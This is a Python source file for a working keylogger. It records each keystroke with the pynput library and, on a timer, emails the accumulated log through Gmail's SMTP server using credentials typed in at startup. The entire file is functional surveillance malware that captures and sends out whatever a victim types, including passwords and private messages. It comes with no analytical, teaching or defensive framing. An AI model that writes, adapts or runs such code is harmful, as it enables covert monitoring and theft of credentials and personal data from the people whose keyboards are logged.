import smtplib
import datetime
from pynput import keyboard
from threading import Timer



class Keylogger:
    def __init__(self, interval=300):
        # Time interval for sending mails.
        self.interval = interval
        # Used to store keystrokes captured from the device.
        self.logs = ''
        self.email = ''
        self.password = ''


    def handle_key_press(self, key):
        try:
            self.logs += key.char
        except AttributeError:
            if key == keyboard.Key.backspace:
                self.logs = self.logs[:-1]
            elif key == keyboard.Key.enter:
                self.logs += '[ENTER]\n' 
            elif key == keyboard.Key.space:
                self.logs += ' '
            else:
                pass


    def request_mail_credentials(self):
        self.email = input('Enter Email: ')
        self.password = input('Enter Password: ')


    def send_mail(self, email, password, msg):
        # You can change your smtp server if you use a different mail
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.ehlo()
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, msg)
        except Exception as e:
            print('An error occurred: ', e)
        finally:
            server.quit()


    def report(self):
        if self.logs:    
            log_date = datetime.datetime.now()
            msg = f'Subject: Log info {log_date}\n' + self.logs
            self.send_mail(self.email, self.password, msg)
        self.logs = ''
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()


    def start(self):
        self.request_mail_credentials()
        self.report()
        with keyboard.Listener(on_release=self.handle_key_press) as listener:
            listener.join()



if __name__ == '__main__':
    keylogger = Keylogger(10)
    keylogger.start()



# promise is a good boy